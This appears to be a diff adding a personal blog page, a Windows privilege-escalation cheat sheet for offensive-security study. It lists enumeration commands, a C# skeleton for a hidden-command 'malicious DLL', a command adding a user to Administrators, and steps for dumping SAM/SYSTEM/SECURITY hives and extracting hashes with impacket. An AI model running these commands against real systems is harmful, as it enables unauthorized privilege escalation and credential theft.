@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Windows Privilege Escalation — cheat sheet | lucas.albino</title>
+<meta name="description" content="Windows privilege escalation cheat sheet: enumeration, services, ACLs, scheduled tasks, DLL hijacking and hash dumping.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='18' fill='%230a0e13'/><text y='68' x='50' text-anchor='middle' font-size='58' font-family='monospace' fill='%23ff2b3d'>&gt;_</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="wrap nav-in">
+    <a class="brand" href="../index.html"><span class="sig">&gt;_</span> lucas<span class="sig">.</span>albino</a>
+    <button class="nav-toggle" aria-label="Open menu" aria-expanded="false">&#9776;</button>
+    <div class="nav-links">
+      <a href="../index.html#about">./about</a>
+      <a href="../index.html#exp">./exp</a>
+      <a href="../index.html#labs">./labs</a>
+      <a href="../writeups.html" class="active">./writeups</a>
+      <a href="../index.html#contact">./contact</a>
+    </div>
+    <a class="lang-btn" href="../../writeups/windows-privesc.html" hreflang="pt-BR" aria-label="Versão em português"><span class="off">PT</span> · <span class="on">EN</span></a>
+  </div>
+</nav>
+
+<article class="article">
+  <div class="wrap prose">
+    <a class="back" href="../writeups.html">&larr; writeups</a>
+
+    <div class="article-head">
+      <div class="post-meta">
+        <span>aug 2026</span>
+        <span class="chip ad">Windows</span>
+        <span class="chip red">Privilege Escalation</span>
+        <span>cheat sheet</span>
+      </div>
+      <h1>Windows Privilege Escalation — cheat sheet</h1>
+      <p style="color:var(--txt-dim);margin:0">
+        Enumeration and common Windows privilege-escalation vectors via CMD and PowerShell:
+        services, permissions, scheduled tasks, DLL hijacking and hash dumping.
+      </p>
+    </div>
+
+    <div class="disclosure">
+      <strong>// disclaimer</strong><br>
+      Content created strictly for educational purposes and the study of offensive security. Using
+      these techniques against systems without prior authorization is illegal.
+    </div>
+
+    <h2>1. Basic enumeration</h2>
+    <h3>Identity and privileges</h3>
+    <pre><code>whoami
+whoami /priv            # Shows the user's privileges
+whoami /all             # Full user information</code></pre>
+
+    <h3>Users and groups</h3>
+    <pre><code>net user                # Lists machine users
+net user &lt;user&gt;          # User details
+net localgroup          # Lists local groups
+
+net localgroup "Remote Desktop Users"
+net localgroup Administrators</code></pre>
+
+    <h2>2. Files and directories</h2>
+    <h3>Hidden files</h3>
+    <pre><code># CMD
+dir /a
+
+# PowerShell
+Get-ChildItem -Force
+dir -Force</code></pre>
+
+    <h3>Recursive search (equivalent to Linux <code>find</code>)</h3>
+    <pre><code>Get-ChildItem -Path "C:\Program Files" -Recurse -Force
+
+# Ignore errors: -ErrorAction SilentlyContinue
+Get-ChildItem -Path "C:\Program Files\Corporate Tools" -Recurse -Force -ErrorAction SilentlyContinue</code></pre>
+
+    <h2>3. Content search (equivalent to <code>grep</code>)</h2>
+    <pre><code># Count lines
+Get-Content .\events.csv | Measure-Object
+
+# Search for a specific word
+Get-Content .\events.csv | Select-String "word"
+Select-String -Path .\events.csv -Pattern "word"</code></pre>
+
+    <h2>4. Windows registry</h2>
+    <pre><code># List specific keys
+Get-ChildItem "HKLM:\SOFTWARE\CorporateApps\"
+
+# Search recursively
+Get-ChildItem "HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue |
+  Get-ItemProperty -ErrorAction SilentlyContinue |
+  Where-Object { $_ -match "desired_string" }
+
+# CMD alternative
+reg query &lt;key&gt;</code></pre>
+
+    <h2>5. Permissions (ACL)</h2>
+    <pre><code># CMD
+icacls &lt;file&gt;
+
+# PowerShell
+Get-Acl .\file.txt | Format-List</code></pre>
+
+    <h2>6. Interesting files</h2>
+    <pre><code># Search for backups
+dir C:\ -Recurse -Filter "*.bak" -ErrorAction SilentlyContinue | Select-Object FullName
+
+# Always check permissions
+icacls &lt;file&gt;</code></pre>
+
+    <h2>7. Run as another user (equivalent to <code>su</code>)</h2>
+    <pre><code>runas /user:svcadmin powershell
+
+# Alternative: RunasCs (runs without an interactive password prompt)</code></pre>
+
+    <h2>8. Scheduled tasks</h2>
+    <pre><code># CMD
+schtasks /query /fo List /v
+schtasks /query /fo List /v | findstr &lt;name&gt;
+
+# PowerShell
+Get-ScheduledTask</code></pre>
+
+    <h2>9. Services</h2>
+    <pre><code># CMD
+sc qc ServiceName
+
+# PowerShell
+Get-CimInstance Win32_Service -Filter "Name='ServiceName'"
+
+# Running services
+Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" }
+
+# Show the service Path
+Get-CimInstance Win32_Service -Filter "Name='ServiceName'" | Select-Object Name, PathName</code></pre>
+
+    <h2>10. Local port enumeration</h2>
+    <pre><code>netstat -ano
+Get-NetTCPConnection
+
+# Test a local endpoint
+iwr -uri http://127.0.0.1:PORT
+iwr -uri http://127.0.0.1:PORT -UseBasicParsing</code></pre>
+
+    <h2>11. DLL hijacking (concept)</h2>
+    <p>Conditions to check:</p>
+    <ul>
+      <li>Service running as LocalSystem</li>
+      <li>Weak permissions on the service folder</li>
+      <li>DLL missing from the execution directory</li>
+    </ul>
+    <p>Basic structure of a malicious DLL (C#):</p>
+    <pre><code>using System;
+using System.Diagnostics;
+
+public class Helper
+{
+    public static void Init()
+    {
+        Process.Start(new ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c command_here",
+            WindowStyle = ProcessWindowStyle.Hidden,
+            CreateNoWindow = true
+        });
+    }
+}</code></pre>
+    <p><strong>Command example</strong> — adds a user to the administrators group:</p>
+    <pre><code>/c net localgroup Administrators svcadmin /add
+
+# PowerShell with elevated privileges
+Start-Process powershell -Verb runAs</code></pre>
+
+    <h2>12. Hash dumping</h2>
+    <pre><code># Save the registry hives
+reg save HKLM\SECURITY C:\Temp\security.save
+reg save HKLM\SYSTEM   C:\Temp\system.save
+reg save HKLM\SAM      C:\Temp\sam.save
+
+# Offline extraction
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+
+# Enable Restricted Admin
+reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0</code></pre>
+
+    <h2>Mental checklist — Windows PrivEsc</h2>
+    <ul>
+      <li>Check privileges (<code>whoami /priv</code>)</li>
+      <li>Review administrative groups</li>
+      <li>Search for backup files</li>
+      <li>Look for credentials in files</li>
+      <li>Enumerate services</li>
+      <li>Check for weak permissions (<code>icacls</code>)</li>
+      <li>Review scheduled tasks</li>
+      <li>Check local ports</li>
+      <li>Inspect the registry</li>
+      <li>Assess DLL hijacking potential</li>
+    </ul>
+
+    <p style="margin-top:40px">
+      <a class="back" href="../writeups.html">&larr; back to writeups</a>
+      &nbsp;·&nbsp;
+      <a href="https://github.com/LucasRAlbino/The-Hacking-Lab/tree/main/Privilege%20Escalation/Windows" target="_blank" rel="noopener">source on GitHub &nearr;</a>
+    </p>
+  </div>
+</article>
+
+<footer>
+  <div class="wrap foot-in">
+    <span>&copy; <span id="year">2026</span> lucas rodrigues albino</span>
+    <span>Campina Grande, PB · Brazil</span>
+    <span><a href="../index.html">home</a></span>
+  </div>
+</footer>
+
+<script src="../../assets/js/main.js"></script>
+</body>
+</html>
